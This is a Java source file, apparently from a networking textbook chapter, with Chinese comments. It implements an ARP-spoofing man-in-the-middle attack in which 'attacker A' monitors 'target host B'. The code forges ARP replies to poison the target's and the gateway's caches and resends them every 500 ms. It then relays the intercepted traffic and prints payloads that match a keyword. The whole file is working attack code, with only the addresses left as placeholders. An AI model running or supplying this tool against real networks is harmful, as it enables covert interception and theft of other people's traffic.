package chapter11;

import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.PacketReceiver;
import jpcap.packet.*;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.InetAddress;

/**
 * 攻击者A试图监控目标主机B上网的数据包
 */
public class ARPTrap {

  private NetworkInterface[] devices; //设备列表
  private NetworkInterface device; //要使用的设备
  private JpcapCaptor captor; //用于捕获包
  private JpcapSender sender; //用于发送包
  private byte[] targetMAC, gateMAC; //被监控目标B的MAC和网关的MAC
  private byte[] attackerMAC; //攻击者A的MAC
  private String targetIp, gateIp; //被监控目标B的IP及网关的IP
  private ARPPacket arpReplyToTarget;//用于欺骗被监控目标B的ARP REPLAY包
  private ARPPacket arpReplyToGate;//用于欺骗网关的ARP REPLAY包


  public static void main(String[] args) throws IOException {
    //监控目标B的MAC地址及网关的MAC地址
    byte[] targetMAC, gateMAC;
    String targetIP, gateIP;//监控目标B的IP地址，真实网关的IP地址

    //网关的MAC和IP地址
    gateMAC = new byte[]{(byte)1,(byte)2,(byte)3,(byte)4,(byte)5,(byte)6};
    gateIP = "*.*.*.*";

    //被监控机器的MAC及IP地址
    targetMAC = new byte[]{(byte)7,(byte)8,(byte)9,(byte)10,(byte)11,(byte)12};
//    targetMAC = IPKit.convertMacFormat("0e-0e-0e-0e-0e-0e");
    targetIP = "*.*.*.*";

    ARPTrap arpTrap = new ARPTrap(targetMAC, targetIP, gateMAC, gateIP);
    arpTrap.captureAndForward();
  }


  /**
   * 修改监控目标机器B和网关的ARP表。因为网关会定时发数据包刷新自己和B的缓存表，所以必须每隔一
   * 段时间就发一次包重新更改B和网关的ARP表。
   * targetMAC 被监控机器B的MAC地址；
   * targetIp 被监控机器B的IP地址；
   * attackerMAC 攻击者A的MAC地址；
   * gateIp 真实网关的IP;
   */
  public ARPTrap(byte[] targetMAC, String targetIp, byte[] gateMAC, String gateIp)
      throws IOException {
    this.targetMAC = targetMAC;
    this.targetIp = targetIp;
    this.gateMAC = gateMAC;
    this.gateIp = gateIp;

    //初始化网卡设备，为device、sender、captor赋值
    initJpcapCaptor();

    //获得攻击者的MAC
    this.attackerMAC = device.mac_address;

    //发送ARP包修改目标机器B的ARP缓存表，用(网关IP,攻击者A的MAC)替换掉正常的(网关IP,网关MAC)
    arpReplyToTarget = forgedARPPacket(gateIp, attackerMAC,
        targetIp, targetMAC);

    //发送ARP包修改网关的ARP缓存表，用(监控目标B的IP,攻击者A的MAC)替换掉正常的(监控目标B的IP,监控目标B的MAC)
    arpReplyToGate = forgedARPPacket(targetIp, attackerMAC,
        gateIp, gateMAC);

    System.out.println("arpReplyToTarget：" + arpReplyToTarget);
    System.out.println("arpReplyToGate：" + arpReplyToGate);

    //创建一个进程控制发ARP包速度
    new Thread(() -> {
      while (true) {
        sender.sendPacket(arpReplyToTarget);
        sender.sendPacket(arpReplyToGate);
        try {
          Thread.sleep(500);
        } catch (InterruptedException ex) {
        }
      }
    }).start();
  }

  /**
   * 初始化攻击者A的设备
   */
  private void initJpcapCaptor() throws IOException {
    devices = JpcapCaptor.getDeviceList(); //获得设备列表
    device = devices[0]; //选择可用的设备
    captor = JpcapCaptor.openDevice(device, 65535, true, 100); //打开与设备的连接
    captor.setFilter("ip and  host   " + targetIp, true);//设置过滤器
    sender = captor.getJpcapSenderInstance();

  }

  /**
   * @param senderIP    ARP缓存表中的IP
   * @param senderMAC   ARP缓存表中的IP对应的MAC(用攻击者的MAC代替真实的MAC)
   * @param receiverIP  被修改ARP缓存表的那台机器的IP
   * @param receiverMAC 被修改ARP缓存表的那台机器的MAC
   * @return
   * @throws IOException
   */
  private ARPPacket forgedARPPacket(String senderIP, byte[] senderMAC,
                                    String receiverIP, byte[] receiverMAC) throws IOException {
    ARPPacket arpReply = new ARPPacket();
    arpReply.hardtype = ARPPacket.HARDTYPE_ETHER; //选择以太网类型(Ethernet)
    arpReply.prototype = ARPPacket.PROTOTYPE_IP; //选择IP网络协议类型
    arpReply.operation = ARPPacket.ARP_REPLY; //选择REPLY类型
    arpReply.hlen = 6; //MAC地址长度固定6个字节
    arpReply.plen = 4; //IP地址长度固定4个字节
    arpReply.sender_hardaddr = senderMAC;
    arpReply.sender_protoaddr = InetAddress.getByName(senderIP).getAddress();
    arpReply.target_hardaddr = receiverMAC;
    arpReply.target_protoaddr = InetAddress.getByName(receiverIP).getAddress();

    EthernetPacket eth = new EthernetPacket(); //创建一个以太网头
    eth.frametype = EthernetPacket.ETHERTYPE_ARP; //选择以太包类型
    eth.src_mac = senderMAC;
    eth.dst_mac = receiverMAC;
    arpReply.datalink = eth; //将以太头添加到ARP包前

    return arpReply;
  }


  /**
   * 修改包的以太头，转发数据包
   * 参数 packet 收到的数据包
   * 参数 changedMAC 要转发出去的目标
   */
  private void send(Packet packet, byte[] changedMAC) {
    EthernetPacket eth;
    if (packet.datalink instanceof EthernetPacket) {
      eth = (EthernetPacket) packet.datalink;
      for (int i = 0; i < 6; i++) {
        eth.dst_mac[i] = changedMAC[i]; //修改以太头，改变包的目标
        eth.src_mac[i] = attackerMAC[i]; //源发送者为攻击者A
      }
      packet.datalink = eth;
      sender.sendPacket(packet);
    }
  }

  /**
   * 攻击者A截获数据包并转发
   */
  public void captureAndForward() {

    new Thread(() -> {
      while (true) {
        captor.processPacket(1, new PacketHandler());
      }
    }).start();

  }

  class PacketHandler implements PacketReceiver {

    @Override
    public void receivePacket(Packet packet) {
      if (packet instanceof IPPacket) {

        IPPacket ipPacket = (IPPacket) packet;
        if (ipPacket.src_ip.getHostAddress().equals(targetIp)) {
          send(ipPacket, gateMAC);
        }
        if (ipPacket.dst_ip.getHostAddress().equals(targetIp)) {
          send(ipPacket, targetMAC);
        }
        try {
          String data = new String(packet.data, 0, packet.data.length, "utf-8");
          //嗅探感兴趣的数据
          if (data.contains("keyValue")  )
            System.out.println(data);
        } catch (UnsupportedEncodingException e) {
          e.printStackTrace();
        }
      }
    }
  }
}
